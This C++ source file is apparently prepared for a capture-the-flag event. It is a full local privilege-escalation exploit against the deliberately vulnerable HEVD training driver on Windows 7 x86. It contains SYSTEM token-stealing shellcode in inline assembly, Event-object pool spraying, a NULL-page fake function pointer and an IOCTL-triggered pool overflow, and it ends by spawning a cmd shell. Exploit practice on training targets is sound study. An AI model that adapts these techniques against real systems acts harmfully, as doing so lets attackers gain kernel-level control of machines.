/*
*	[+] HEVD pool overflow
*	[+] windows 7 x86
*	[+] prepare for DDCTF
*/

#include <iostream>
#include <Windows.h>

HANDLE hDevice = NULL;

#define POOL_OVERFLOW_NUMBER 0x22200f

typedef
NTSTATUS
(WINAPI *pfNtAllocateVirtualMemory) (
	HANDLE       ProcessHandle,
	PVOID       *BaseAddress,
	ULONG_PTR    ZeroBits,
	PSIZE_T      RegionSize,
	ULONG        AllocationType,
	ULONG        Protect
	);

pfNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

VOID shellCode()
{
	__asm
	{
		pushad
		mov eax, fs:[124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
					 mov eax, [eax + 0b8h]
					 sub eax, 0b8h
					 cmp[eax + 0b4h], edx
					 jnz find_sys_pid
		
		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
	    popad
	}
}

HANDLE spray_event[0x1000] = {};
// ʹ��CreateEvent APIȥ���Ʒ�ˮ����
VOID poolFengShui()
{
	// ���������0x40��pool
	for (int i = 0; i < 0x1000; i++)
		spray_event[i] =  CreateEventA(NULL, FALSE, FALSE, NULL);	// 0x40

	// 0x40 * 8 = 0x200
	for (int i = 0; i < 0x1000; i++)
	{
		for(int j = 0; j < 0x8; j++)
			CloseHandle(spray_event[i+j]);
		i += 8;
	}

	// �������
}

BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}

/*
* ����
*/
VOID exploit()
{
	const int overLength = 0x1f8;
	const int headerLength = 0x28;
	DWORD lpBytesReturned = 0;
	char buf[overLength+headerLength];
	memset(buf,0x41 ,overLength+headerLength);
	
	// α�����õ�����
	// α��typeInfo. ʹ��Ϊ0x00
	*(DWORD*)(buf + overLength + 0x00) = 0x04080040;
	*(DWORD*)(buf + overLength + 0x04) = 0xee657645;
	*(DWORD*)(buf + overLength + 0x08) = 0x00000000;
	*(DWORD*)(buf + overLength + 0x0c) = 0x00000040;
	*(DWORD*)(buf + overLength + 0x10) = 0x00000000;
	*(DWORD*)(buf + overLength + 0x14) = 0x00000000;
	*(DWORD*)(buf + overLength + 0x18) = 0x00000001;
	*(DWORD*)(buf + overLength + 0x1c) = 0x00000001;
	*(DWORD*)(buf + overLength + 0x20) = 0x00000000;
	*(DWORD*)(buf + overLength + 0x24) = 0x00080000;	// key fake here

	/*
	*	[+] (TYPEINFO Ϊ0x00)α��0x60, ���Ǻ���ָ��ʹ��ִ��shellcode
	*/
	PVOID               fakeAddr = (PVOID)1;
	SIZE_T              MemSize = 0x1000;

	*(FARPROC *)&NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == NULL)
	{
		return ;
	}

	std::cout << "[+]" << __FUNCTION__ << std::endl;
	if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
		&fakeAddr,
		0,
		&MemSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || fakeAddr != NULL)
	{
		std::cout << "[-]Memory alloc failed!" << std::endl;
		return ;
	}
	*(DWORD*)(0 + 0x60) = (DWORD)&shellCode;	// changeΪshellcode��ַ

	poolFengShui();
	DeviceIoControl(hDevice, POOL_OVERFLOW_NUMBER, buf, overLength+headerLength, NULL, 0, &lpBytesReturned, NULL); // 0x1f8 ԭ�д�С 0x8����header
}

VOID runShellCode()
{
	for (int i = 0; i < 0x1000; i++)
	{
		if (spray_event[i]) CloseHandle(spray_event[i]);
	}
}
/*
* popCmdToConfirm:
*	[+] ����cmd������֤��Ȩ�Ƿ�ɹ�
*	[+] ��Դ: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

int main()
{
	std::cout << "[+] init" << std::endl;
	if (initWriteWhatWhereEnvironment() == FALSE)
	{
		std::cout << "[+] Init failed!!!" << std::endl;
		system("pause");
		return 0;
	}

	std::cout << "[+] Exploit" << std::endl;
	exploit();
	std::cout << "[+] Run oue shellcode" << std::endl;
	runShellCode();

	std::cout << "[+] Pop a cmd To confirm" << std::endl;
	popCmdToConfirm();
	return 0;
}